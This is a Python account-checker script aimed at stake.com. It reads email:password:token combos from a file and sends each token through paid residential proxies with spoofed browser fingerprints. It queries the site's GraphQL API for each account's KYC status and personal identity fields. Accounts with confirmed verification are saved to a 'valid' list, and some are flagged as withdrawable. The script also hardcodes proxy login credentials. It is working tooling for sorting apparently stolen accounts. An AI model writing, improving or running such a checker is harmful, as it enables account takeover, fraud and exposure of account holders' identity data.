from multiprocessing import Process
import tls_client
from colorama import Fore

session = tls_client.Session(client_identifier="opera_91")

with open("acc.txt", "r") as f:
    lines = [line.strip() for line in f.readlines()]

user = "bd626a2fa897ddc96edb__cr.fi"
password = "4eda232f2391a734"
ip = "premiumresidential.sigmaproxies.com"
port = "823"

proxies = {
                'http': f'http://{user}:{password}@{ip}:{port}',
                'https': f'http://{user}:{password}@{ip}:{port}'
            }

red = Fore.LIGHTRED_EX
blue = Fore.LIGHTBLUE_EX
green = Fore.LIGHTGREEN_EX


class Checker():
    def __init__(self, email, password, stake_token):
        super().__init__()
        self.stake_token = stake_token
        self.email = email
        self.password = password

    def run(self):
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'access-control-allow-origin': '*',
                'content-type': 'application/json',
                'origin': 'https://stake.com',
                'priority': 'u=1, i',
                'referer': 'https://stake.com/settings',
                'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',  # noqa: E501
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version-list': '"Brave";v="143.0.0.0", "Chromium";v="143.0.0.0", "Not A(Brand";v="24.0.0.0"',  # noqa: E501
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',  # noqa: E501
                'x-access-token': str(self.stake_token),
                'x-language': 'en',
                'x-operation-name': 'UserKycInfo',
                'x-operation-type': 'query',
            }

            json_data = {
                'query': 'query UserKycInfo($stakeKycEnabled: Boolean = false, $veriffEnabled: Boolean = false, $singleKycEnabled: Boolean = false) {\n  isDiscontinuedBlocked\n  user {\n    id\n    roles {\n      name\n    }\n    optionalFeatures\n    kycStatus\n    dob\n    createdAt\n    hasEmailVerified\n    phoneNumber\n    phoneCountryCode\n    hasPhoneNumberVerified\n    email\n    registeredWithVpn\n    isBanned\n    isCompromised\n    isSuspended\n    isFiatWithdrawOnly\n    isFiatSuspended\n    resubmitVerification {\n      level\n    }\n    isSuspendedSportsbook\n    alternateNames: cashierAlternateNames {\n      firstName\n      lastName\n      currency\n    }\n    nationalId {\n      nationalId\n      expireDate\n      issueDate\n    }\n    vipInfo {\n      hostStatus\n    }\n    ...StakeKyc @include(if: $stakeKycEnabled)\n    ...Veriff @include(if: $veriffEnabled)\n    ...StakeFiatCountryConfiguration @include(if: $stakeKycEnabled)\n    ...StakeFiatCountryConfiguration @include(if: $singleKycEnabled)\n    ...KycDenmark @include(if: $singleKycEnabled)\n  }\n}\n\nfragment StakeKyc on User {\n  isKycBasicRequired\n  isKycExtendedRequired\n  isKycFullRequired\n  isKycUltimateRequired\n  kycBasic {\n    ...UserKycBasic\n  }\n  kycExtended {\n    ...UserKycExtended\n  }\n  kycFull {\n    ...UserKycFull\n  }\n  kycUltimate {\n    ...UserKycUltimate\n  }\n  transactionEligibilityState {\n    ...UserTransactionEligibilityStateFragment\n  }\n  isKycBypassed\n}\n\nfragment UserKycBasic on UserKycBasic {\n  active\n  address\n  birthday\n  city\n  country\n  createdAt\n  firstName\n  id\n  lastName\n  phoneNumber\n  rejectedReason\n  status\n  updatedAt\n  zipCode\n  placeOfBirth\n  industry\n  occupation\n  occupationExperience\n}\n\nfragment UserKycExtended on UserKycExtended {\n  id\n  active\n  createdAt\n  id\n  rejectedReason\n  status\n}\n\nfragment UserKycFull on UserKycFull {\n  active\n  createdAt\n  id\n  rejectedReason\n  status\n}\n\nfragment UserKycUltimate on UserKycUltimate {\n  id\n  active\n  createdAt\n  id\n  rejectedReason\n  status\n}\n\nfragment UserTransactionEligibilityStateFragment on UserTransactionEligibilityState {\n  fiat {\n    ...FiatTransactionEligibilityStateFragment\n  }\n  crypto {\n    ...CryptoTransactionEligibilityStateFragment\n  }\n  useLegacyLogic\n  requirementVersion\n}\n\nfragment FiatTransactionEligibilityStateFragment on FiatTransactionEligibilityState {\n  currency\n  depositEnabled\n  withdrawalEnabled\n}\n\nfragment CryptoTransactionEligibilityStateFragment on CryptoTransactionEligibilityState {\n  depositEnabled\n  withdrawalEnabled\n}\n\nfragment Veriff on User {\n  veriffStatus\n  veriffUser {\n    reason\n  }\n}\n\nfragment StakeFiatCountryConfiguration on User {\n  fiatCountryConfiguration {\n    country\n    flag\n    nationalIdRequired\n    alternateName {\n      userVisibleInstructions\n      regex\n      firstNamePresentedFirst\n    }\n    currencies {\n      name\n      withdrawal {\n        visible\n        enabled\n      }\n      deposit {\n        visible\n        enabled\n      }\n    }\n  }\n}\n\nfragment KycDenmark on User {\n  kycDenmark {\n    firstName\n    lastName\n    birthDate\n    gender\n    cprNumber\n    status\n    isValid\n    reason\n    createdAt\n    updatedAt\n  }\n  mitIdValidationStatus {\n    validStatus\n    reason\n  }\n}',  # noqa: E501
                'variables': {
                    'stakeKycEnabled': True,
                    'veriffEnabled': False,
                    'singleKycEnabled': False,
                },
            }

            response = session.post('https://stake.com/_api/graphql',
                                    proxy=proxies,
                                    headers=headers,
                                    json=json_data).json()
            status = response["data"]["user"]["kycExtended"]["status"]
            resubmitVerification = response["data"]["user"]["resubmitVerification"]  # noqa: E501

            if any(item.get("level") == 2 for item in resubmitVerification) or any(item.get("level") == 1 for item in resubmitVerification):  # noqa: E501
                print(f"{self.email}:{self.password}:{self.stake_token}:{blue}Withdraw-Mode{Fore.RESET}")  # noqa: E501
                return

            format_acc = f"{self.email}:{self.password}:{self.stake_token}"
            print(f"{self.email}:{self.password}:{self.stake_token}:{green}{status}{Fore.RESET}")  # noqa: E501

            if status == "confirmed":
                with open("vaild.txt", "a") as f:
                    f.write(format_acc+"\n")
                    f.close()
                    return
        except:  # noqa: E722
            print(f"{self.email}:{self.password}:{self.stake_token}:{red}Expired{Fore.RESET}")  # noqa: E501


threads = []

if __name__ == "__main__":
    for i in lines:
        stake_token = str(i)
        stake_token = stake_token.split(":", 2)
        email = stake_token[0]
        password = stake_token[1]
        stake_token = stake_token[2]
        thread = Process(target=Checker(email=email,
                                        password=password,
                                        stake_token=stake_token).run())
        thread.start()
        threads.append(thread)
        for process in threads:
            thread.join()
